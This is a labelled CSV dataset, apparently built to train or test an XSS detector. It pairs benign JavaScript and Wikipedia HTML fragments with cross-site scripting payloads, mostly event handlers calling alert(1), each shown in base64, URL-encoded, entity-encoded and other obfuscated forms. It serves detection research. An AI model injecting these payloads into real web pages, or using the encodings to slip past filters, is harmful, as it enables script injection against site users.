sample_id,variant_id,technique,payload_original,payload_obfuscated,label
1972,3,base64,"<div draggable=""true"" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>",PGRpdiBkcmFnZ2FibGU9InRydWUiIGNvbnRlbnRlZGl0YWJsZT5kcmFnIG1lPC9kaXY+PHN1bW1hcnkgb25kcmFnb3Zlcj1hbGVydCgxKSBjb250ZW50ZWRpdGFibGU+ZHJvcCBoZXJlPC9zdW1tYXJ5Pg==,1
1973,0,none,x -= offsetx - popperrect.width; x *= gpuacceleration ? 1 : -1; },x -= offsetx - popperrect.width; x *= gpuacceleration ? 1 : -1; },0
1974,0,none,} dismiss() { window.clearinterval(this.counterinterval);,} dismiss() { window.clearinterval(this.counterinterval);,0
1975,0,none,if (getcomputedstyle(element).position !== 'fixed') {,if (getcomputedstyle(element).position !== 'fixed') {,0
1976,0,none,this.isopen = false; } });,this.isopen = false; } });,0
1977,0,none,effect.wrapinput([element]),effect.wrapinput([element]),0
1978,0,none,if (opts.isempty) { if (opts.showdaysinnextandpreviousmonths) { arr.push('is-outside-current-month');,if (opts.isempty) { if (opts.showdaysinnextandpreviousmonths) { arr.push('is-outside-current-month');,0
1979,0,none,"var camelregex = /(?:^\w|[a-z]|\b\w)/g, whitespace = /[\s-_]+/g; return function (str) { return str.replace(camelregex, function (letter, index) {","var camelregex = /(?:^\w|[a-z]|\b\w)/g, whitespace = /[\s-_]+/g; return function (str) { return str.replace(camelregex, function (letter, index) {",0
1980,0,none,"<ul><li><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, pp.&#160;430–449 </li> </ul>","<ul><li><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, pp.&#160;430–449 </li> </ul>",0
1981,0,none,"radius = ishours && value > 0 && value < 13 ? this.options.innerradius : this.options.outerradius, x = math.sin(radian) * radius, y = -math.cos(radian) * radius,","radius = ishours && value > 0 && value < 13 ? this.options.innerradius : this.options.outerradius, x = math.sin(radian) * radius, y = -math.cos(radian) * radius,",0
1982,1,base64,"<audio id=x controls onfocusin=alert(1) id=x><source src=""validaudio.wav""></audio>",PGF1ZGlvIGlkPXggY29udHJvbHMgb25mb2N1c2luPWFsZXJ0KDEpIGlkPXg+PHNvdXJjZSBzcmM9InZhbGlkYXVkaW8ud2F2Ij48L2F1ZGlvPg==,1
1982,2,whitespace_noise,"<audio id=x controls onfocusin=alert(1) id=x><source src=""validaudio.wav""></audio>","< audio id=x controls onfocusin=alert(1) id=x>< source src=""validaudio.wav""></audio>",1
1982,3,html_entities,"<audio id=x controls onfocusin=alert(1) id=x><source src=""validaudio.wav""></audio>",&lt;audio id=x controls onfocusin=alert(1) id=x&gt;&lt;source src=&quot;validaudio.wav&quot;&gt;&lt;/audio&gt;,1
1983,0,none,"<li><a href=""/wiki/probability"" title=""probability"">probability </a> </li>","<li><a href=""/wiki/probability"" title=""probability"">probability </a> </li>",0
1984,0,none,} static get defaulttype() { return defaulttype$a;,} static get defaulttype() { return defaulttype$a;,0
1985,1,base64,<textarea onpaste=alert(1) autofocus></textarea>,PHRleHRhcmVhIG9ucGFzdGU9YWxlcnQoMSkgYXV0b2ZvY3VzPjwvdGV4dGFyZWE+,1
1985,2,comment_marker,<textarea onpaste=alert(1) autofocus></textarea>,<textarea on/*OBF*/pas/*OBF*/te=alert(1) autofo/*OBF*/cus></textarea>,1
1985,3,urlencode,<textarea onpaste=alert(1) autofocus></textarea>,%3Ctextarea%20onpaste%3Dalert%281%29%20autofocus%3E%3C%2Ftextarea%3E,1
1986,1,base64,<slot onpointerenter=alert(1)>xss</slot>,PHNsb3Qgb25wb2ludGVyZW50ZXI9YWxlcnQoMSk+eHNzPC9zbG90Pg==,1
1986,2,urlencode,<slot onpointerenter=alert(1)>xss</slot>,%3Cslot%20onpointerenter%3Dalert%281%29%3Exss%3C%2Fslot%3E,1
1986,3,whitespace_noise,<slot onpointerenter=alert(1)>xss</slot>,< slot onpointerenter=alert(1)>xss</  slot>,1
1987,0,none,_updatetooltipcontent() {,_updatetooltipcontent() {,0
1988,0,none,"document.body.removeeventlistener('click', this._handledocumentclickbound, true); document.body.removeeventlistener('touchend', this._handledocumentclickbound); }","document.body.removeeventlistener('click', this._handledocumentclickbound, true); document.body.removeeventlistener('touchend', this._handledocumentclickbound); }",0
1989,0,none,"<li><a href=""/wiki/qualia"" title=""qualia"">qualia </a> </li>","<li><a href=""/wiki/qualia"" title=""qualia"">qualia </a> </li>",0
1990,1,comment_marker,"<head draggable=""true"" ondragleave=""alert(1)"">test</head>","<head drag/*OBF*/gable=""true"" on/*OBF*/draglea/*OBF*/ve=""alert(1)"">test</head>",1
1990,2,double_urlencode,"<head draggable=""true"" ondragleave=""alert(1)"">test</head>",%253Chead%2520draggable%253D%2522true%2522%2520ondragleave%253D%2522alert%25281%2529%2522%253Etest%253C%252Fhead%253E,1
1990,3,whitespace_noise,"<head draggable=""true"" ondragleave=""alert(1)"">test</head>","<head draggable=""true""  ondragleave=""alert(1)  "">test</head>",1
1991,1,double_urlencode,<time onpointerdown=alert(1)>xss</time>,%253Ctime%2520onpointerdown%253Dalert%25281%2529%253Exss%253C%252Ftime%253E,1
1991,2,comment_marker,<time onpointerdown=alert(1)>xss</time>,<time onpointerdown/*OBF*/=alert(1)>xss</time>,1
1991,3,html_then_urlencode,<time onpointerdown=alert(1)>xss</time>,%26lt%3Btime%20onpointerdown%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Ftime%26gt%3B,1
1992,0,none,"window.index.pipeline.reset(); window.index.add({ href: 'http://materializecss.com/about.html',","window.index.pipeline.reset(); window.index.add({ href: 'http://materializecss.com/about.html',",0
1993,1,whitespace_noise,<pre onpointerup=alert(1)>xss</pre>,< pre onpointerup=alert(  1)>xss</pre>,1
1993,2,urlencode,<pre onpointerup=alert(1)>xss</pre>,%3Cpre%20onpointerup%3Dalert%281%29%3Exss%3C%2Fpre%3E,1
1993,3,comment_marker,<pre onpointerup=alert(1)>xss</pre>,<pre onpointerup=alert(1)>xss</pre>,1
1994,1,html_then_urlencode,"<meta oncopy=""alert(1)"" contenteditable>test</meta>",%26lt%3Bmeta%20oncopy%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Fmeta%26gt%3B,1
1994,2,double_urlencode,"<meta oncopy=""alert(1)"" contenteditable>test</meta>",%253Cmeta%2520oncopy%253D%2522alert%25281%2529%2522%2520contenteditable%253Etest%253C%252Fmeta%253E,1
1994,3,whitespace_noise,"<meta oncopy=""alert(1)"" contenteditable>test</meta>","<meta oncopy=""alert(1)"" contenteditable>  test</meta>",1
1995,0,none,var naturalheight = firstimage[0].naturalheight,var naturalheight = firstimage[0].naturalheight,0
1996,1,double_urlencode,"<figure onmouseout=""alert(1)"">test</figure>",%253Cfigure%2520onmouseout%253D%2522alert%25281%2529%2522%253Etest%253C%252Ffigure%253E,1
1996,2,whitespace_noise,"<figure onmouseout=""alert(1)"">test</figure>","<  figure onmouseout="" alert(  1)"" >test<  /figure>",1
1996,3,urlencode,"<figure onmouseout=""alert(1)"">test</figure>",%3Cfigure%20onmouseout%3D%22alert%281%29%22%3Etest%3C%2Ffigure%3E,1
1997,1,html_then_urlencode,<keygen onpointerenter=alert(1)>xss</keygen>,%26lt%3Bkeygen%20onpointerenter%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Fkeygen%26gt%3B,1
1997,2,base64,<keygen onpointerenter=alert(1)>xss</keygen>,PGtleWdlbiBvbnBvaW50ZXJlbnRlcj1hbGVydCgxKT54c3M8L2tleWdlbj4=,1
1997,3,urlencode,<keygen onpointerenter=alert(1)>xss</keygen>,%3Ckeygen%20onpointerenter%3Dalert%281%29%3Exss%3C%2Fkeygen%3E,1
1998,1,double_urlencode,<isindex onpointerout=alert(1)>xss</isindex>,%253Cisindex%2520onpointerout%253Dalert%25281%2529%253Exss%253C%252Fisindex%253E,1
1998,2,urlencode,<isindex onpointerout=alert(1)>xss</isindex>,%3Cisindex%20onpointerout%3Dalert%281%29%3Exss%3C%2Fisindex%3E,1
1998,3,html_entities,<isindex onpointerout=alert(1)>xss</isindex>,&lt;isindex onpointerout=alert(1)&gt;xss&lt;/isindex&gt;,1
1999,1,base64,"src=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode",c3JjPSJodHRwOi8vd3d3LnRoZXNpdGV5b3VhcmVvbi5jb20vc29tZWNvbW1hbmQucGhwP3NvbWV2YXJpYWJsZXM9bWFsaWNpb3VzY29kZQ==,1
1999,2,html_then_urlencode,"src=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode",src%3D%26quot%3Bhttp%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode,1
1999,3,double_urlencode,"src=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode",src%253D%2522http%253A%252F%252Fwww.thesiteyouareon.com%252Fsomecommand.php%253Fsomevariables%253Dmaliciouscode,1
2000,0,none,"<dl><dt><a href=""/wiki/agent_architecture"" title=""agent architecture"">agent architectures </a> and <a href=""/wiki/cognitive_architecture"" title=""cognitive architecture"">cognitive architectures </a> </dt>","<dl><dt><a href=""/wiki/agent_architecture"" title=""agent architecture"">agent architectures </a> and <a href=""/wiki/cognitive_architecture"" title=""cognitive architecture"">cognitive architectures </a> </dt>",0
2001,0,none,); $(this.wrapper).prepend(dropdownicon[0]); if (!this.el.disabled) {,); $(this.wrapper).prepend(dropdownicon[0]); if (!this.el.disabled) {,0
2002,1,double_urlencode,"<rp draggable=""true"" ondragstart=""alert(1)"">test</rp>",%253Crp%2520draggable%253D%2522true%2522%2520ondragstart%253D%2522alert%25281%2529%2522%253Etest%253C%252Frp%253E,1
2002,2,whitespace_noise,"<rp draggable=""true"" ondragstart=""alert(1)"">test</rp>","<rp draggable="" true"" ondragstart=  ""alert(1)"">test</rp>  ",1
2002,3,urlencode,"<rp draggable=""true"" ondragstart=""alert(1)"">test</rp>",%3Crp%20draggable%3D%22true%22%20ondragstart%3D%22alert%281%29%22%3Etest%3C%2Frp%3E,1
2003,0,none,"<li><a href=""/wiki/radio-frequency_identification"" title=""radio-frequency identification"">rfid </a>","<li><a href=""/wiki/radio-frequency_identification"" title=""radio-frequency identification"">rfid </a>",0
2004,1,comment_marker,<span onpointermove=alert(1)>xss</span>,<span onpointermove=alert(1)>xss</span>,1
2004,2,whitespace_noise,<span onpointermove=alert(1)>xss</span>,<span onpointermove= alert(1)>xss</ span>,1
2004,3,html_entities,<span onpointermove=alert(1)>xss</span>,&lt;span onpointermove=alert(1)&gt;xss&lt;/span&gt;,1
2005,1,html_entities,<p onblur=alert(1) tabindex=1 id=x></p><input autofocus>,&lt;p onblur=alert(1) tabindex=1 id=x&gt;&lt;/p&gt;&lt;input autofocus&gt;,1
2005,2,comment_marker,<p onblur=alert(1) tabindex=1 id=x></p><input autofocus>,<p onbl/*OBF*/ur=alert(1) tabindex=1 id=x></p><input autofocus>,1
2005,3,urlencode,<p onblur=alert(1) tabindex=1 id=x></p><input autofocus>,%3Cp%20onblur%3Dalert%281%29%20tabindex%3D1%20id%3Dx%3E%3C%2Fp%3E%3Cinput%20autofocus%3E,1
2006,1,urlencode,"<style>@keyframes x{}</style><isindex style=""animation-name:x"" onanimationstart=""alert(1)""></isindex>",%3Cstyle%3E%40keyframes%20x%7B%7D%3C%2Fstyle%3E%3Cisindex%20style%3D%22animation-name%3Ax%22%20onanimationstart%3D%22alert%281%29%22%3E%3C%2Fisindex%3E,1
2006,2,base64,"<style>@keyframes x{}</style><isindex style=""animation-name:x"" onanimationstart=""alert(1)""></isindex>",PHN0eWxlPkBrZXlmcmFtZXMgeHt9PC9zdHlsZT48aXNpbmRleCBzdHlsZT0iYW5pbWF0aW9uLW5hbWU6eCIgb25hbmltYXRpb25zdGFydD0iYWxlcnQoMSkiPjwvaXNpbmRleD4=,1
2006,3,whitespace_noise,"<style>@keyframes x{}</style><isindex style=""animation-name:x"" onanimationstart=""alert(1)""></isindex>","<style>  @keyframes x{}</style><isindex style=""animation-  name:x"" onanimationstart=""alert(1)""></isindex>  ",1
2007,1,urlencode,"<small onmouseenter=""alert(1)"">test</small>",%3Csmall%20onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fsmall%3E,1
2007,2,html_then_urlencode,"<small onmouseenter=""alert(1)"">test</small>",%26lt%3Bsmall%20onmouseenter%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Fsmall%26gt%3B,1
2007,3,comment_marker,"<small onmouseenter=""alert(1)"">test</small>","<small onmouseenter=""alert(1)"">test</small>",1
2008,0,none,"<li class=""toclevel-2 tocsection-37""><a href=""#automotive""><span class=""tocnumber"">7.2","<li class=""toclevel-2 tocsection-37""><a href=""#automotive""><span class=""tocnumber"">7.2",0
2009,0,none,"var rect = this[0].getboundingclientrect(); return { top: rect.top + win.pageyoffset - docel.clienttop,","var rect = this[0].getboundingclientrect(); return { top: rect.top + win.pageyoffset - docel.clienttop,",0
2010,1,whitespace_noise,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><element id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></element>","<style>@keyframes x{from {left:0; }to {left: 1000px;}}:target {animation:  10s ease-in-out 0s 1 x; }</ style><element id=x style=""position:absolute;  "" onanimationcancel=""alert(1)""></element>",1
2010,2,base64,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><element id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></element>",PHN0eWxlPkBrZXlmcmFtZXMgeHtmcm9tIHtsZWZ0OjA7fXRvIHtsZWZ0OiAxMDAwcHg7fX06dGFyZ2V0IHthbmltYXRpb246MTBzIGVhc2UtaW4tb3V0IDBzIDEgeDt9PC9zdHlsZT48ZWxlbWVudCBpZD14IHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTsiIG9uYW5pbWF0aW9uY2FuY2VsPSJhbGVydCgxKSI+PC9lbGVtZW50Pg==,1
2010,3,urlencode,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><element id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></element>",%3Cstyle%3E%40keyframes%20x%7Bfrom%20%7Bleft%3A0%3B%7Dto%20%7Bleft%3A%201000px%3B%7D%7D%3Atarget%20%7Banimation%3A10s%20ease-in-out%200s%201%20x%3B%7D%3C%2Fstyle%3E%3Celement%20id%3Dx%20style%3D%22position%3Aabsolute%3B%22%20onanimationcancel%3D%22alert%281%29%22%3E%3C%2Felement%3E,1
2011,1,whitespace_noise,"<style>:target {color:red;}</style><video id=x style=""transition:color 1s"" ontransitionend=alert(1)></video>","<style>:target {color:red;}</style><video id=x style=""transition:color 1s""   ontransitionend=alert(1)  > </video>",1
2011,2,html_entities,"<style>:target {color:red;}</style><video id=x style=""transition:color 1s"" ontransitionend=alert(1)></video>",&lt;style&gt;:target {color:red;}&lt;/style&gt;&lt;video id=x style=&quot;transition:color 1s&quot; ontransitionend=alert(1)&gt;&lt;/video&gt;,1
2011,3,urlencode,"<style>:target {color:red;}</style><video id=x style=""transition:color 1s"" ontransitionend=alert(1)></video>",%3Cstyle%3E%3Atarget%20%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cvideo%20id%3Dx%20style%3D%22transition%3Acolor%201s%22%20ontransitionend%3Dalert%281%29%3E%3C%2Fvideo%3E,1
2012,0,none,let nativedispatch = true; let defaultprevented = false; if (innamespace && $) {,let nativedispatch = true; let defaultprevented = false; if (innamespace && $) {,0
2013,0,none,"const outerelem = this._getouterelement(child) child.setattribute('aria-selected', isactive) if (outerelem !== child) {","const outerelem = this._getouterelement(child) child.setattribute('aria-selected', isactive) if (outerelem !== child) {",0
2014,0,none,"} = this._config; if (typeof offset === 'string') { return offset.split(',').map(value => number.parseint(value, 10));","} = this._config; if (typeof offset === 'string') { return offset.split(',').map(value => number.parseint(value, 10));",0
2015,0,none,"}); }function r(a, c, d, b) { var f = ""delay"" === a;return c.length ? (f ? math.min : math.max).apply(math, c.map(function (b) {","}); }function r(a, c, d, b) { var f = ""delay"" === a;return c.length ? (f ? math.min : math.max).apply(math, c.map(function (b) {",0
2016,1,urlencode,<optgroup onpointerdown=alert(1)>xss</optgroup>,%3Coptgroup%20onpointerdown%3Dalert%281%29%3Exss%3C%2Foptgroup%3E,1
2016,2,comment_marker,<optgroup onpointerdown=alert(1)>xss</optgroup>,<optgroup onpointerdown=alert(1)>xss</optgroup>,1
2016,3,html_then_urlencode,<optgroup onpointerdown=alert(1)>xss</optgroup>,%26lt%3Boptgroup%20onpointerdown%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Foptgroup%26gt%3B,1
2017,1,whitespace_noise,"<a onmouseout=""alert(1)"">test</a>","<  a onmouseout=  ""alert(1)"">test</a>",1
2017,2,html_then_urlencode,"<a onmouseout=""alert(1)"">test</a>",%26lt%3Ba%20onmouseout%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Fa%26gt%3B,1
2017,3,base64,"<a onmouseout=""alert(1)"">test</a>",PGEgb25tb3VzZW91dD0iYWxlcnQoMSkiPnRlc3Q8L2E+,1
2018,0,none,throw new typeerror(,throw new typeerror(,0
2019,0,none,_inserthtmlintodom() { this.$modalel = $(timepicker._template); this.modalel = this.$modalel[0];,_inserthtmlintodom() { this.$modalel = $(timepicker._template); this.modalel = this.$modalel[0];,0
2020,0,none,class carousel extends basecomponent {,class carousel extends basecomponent {,0
2021,0,none,classes = getclasses(c),classes = getclasses(c),0
2022,1,html_entities,<tt onpointerover=alert(1)>xss</tt>,&lt;tt onpointerover=alert(1)&gt;xss&lt;/tt&gt;,1
2022,2,base64,<tt onpointerover=alert(1)>xss</tt>,PHR0IG9ucG9pbnRlcm92ZXI9YWxlcnQoMSk+eHNzPC90dD4=,1
2022,3,double_urlencode,<tt onpointerover=alert(1)>xss</tt>,%253Ctt%2520onpointerover%253Dalert%25281%2529%253Exss%253C%252Ftt%253E,1
2023,0,none,toast.time = date.now(),toast.time = date.now(),0
2024,0,none,"const selector = getselector(element); return selector ? selectorengine.findone(selector) : null; },","const selector = getselector(element); return selector ? selectorengine.findone(selector) : null; },",0
2025,1,base64,<span onpointerover=alert(1)>xss</span>,PHNwYW4gb25wb2ludGVyb3Zlcj1hbGVydCgxKT54c3M8L3NwYW4+,1
2025,2,whitespace_noise,<span onpointerover=alert(1)>xss</span>,<span onpointerover=alert(1)>xss<  /span>  ,1
2025,3,html_entities,<span onpointerover=alert(1)>xss</span>,&lt;span onpointerover=alert(1)&gt;xss&lt;/span&gt;,1
2026,0,none,"<li><a href=""/wiki/talcott_parsons"" title=""talcott parsons"">talcott parsons </a> </li>","<li><a href=""/wiki/talcott_parsons"" title=""talcott parsons"">talcott parsons </a> </li>",0
2027,1,whitespace_noise,"<input oncontextmenu=""alert(1)"">test</input>","<input oncontextmenu=""alert(1)"">test</  input>",1
2027,2,base64,"<input oncontextmenu=""alert(1)"">test</input>",PGlucHV0IG9uY29udGV4dG1lbnU9ImFsZXJ0KDEpIj50ZXN0PC9pbnB1dD4=,1
2027,3,html_entities,"<input oncontextmenu=""alert(1)"">test</input>",&lt;input oncontextmenu=&quot;alert(1)&quot;&gt;test&lt;/input&gt;,1
2028,0,none,var domelem = !!el.jquery ? el[0] : el; return domelem.m_scrollspy; },var domelem = !!el.jquery ? el[0] : el; return domelem.m_scrollspy; },0
2029,0,none,"}function v(b,f,c,d,e,p,q,k,l,h,n,a){q=a","}function v(b,f,c,d,e,p,q,k,l,h,n,a){q=a",0
2030,1,html_entities,<image onfocusout=alert(1) tabindex=1 id=x></image><input autofocus>,&lt;image onfocusout=alert(1) tabindex=1 id=x&gt;&lt;/image&gt;&lt;input autofocus&gt;,1
2030,2,html_then_urlencode,<image onfocusout=alert(1) tabindex=1 id=x></image><input autofocus>,%26lt%3Bimage%20onfocusout%3Dalert%281%29%20tabindex%3D1%20id%3Dx%26gt%3B%26lt%3B%2Fimage%26gt%3B%26lt%3Binput%20autofocus%26gt%3B,1
2030,3,whitespace_noise,<image onfocusout=alert(1) tabindex=1 id=x></image><input autofocus>,<image onfocusout= alert(1) tabindex=1 id= x></image><input autofocus>,1
2031,0,none,value: function open() { if (this.isopen === true) { return;,value: function open() { if (this.isopen === true) { return;,0
2032,0,none,var $trigger = $(e.target); for (var i = scrollspy._elements.length - 1; i >= 0; i--) { var scrollspy = scrollspy._elements[i];,var $trigger = $(e.target); for (var i = scrollspy._elements.length - 1; i >= 0; i--) { var scrollspy = scrollspy._elements[i];,0
2033,0,none,trigger: 'string' }; class tooltip extends basecomponent {,trigger: 'string' }; class tooltip extends basecomponent {,0
2034,1,double_urlencode,"<menu onkeypress=""alert(1)"" contenteditable>test</menu>",%253Cmenu%2520onkeypress%253D%2522alert%25281%2529%2522%2520contenteditable%253Etest%253C%252Fmenu%253E,1
2034,2,html_entities,"<menu onkeypress=""alert(1)"" contenteditable>test</menu>",&lt;menu onkeypress=&quot;alert(1)&quot; contenteditable&gt;test&lt;/menu&gt;,1
2034,3,urlencode,"<menu onkeypress=""alert(1)"" contenteditable>test</menu>",%3Cmenu%20onkeypress%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fmenu%3E,1
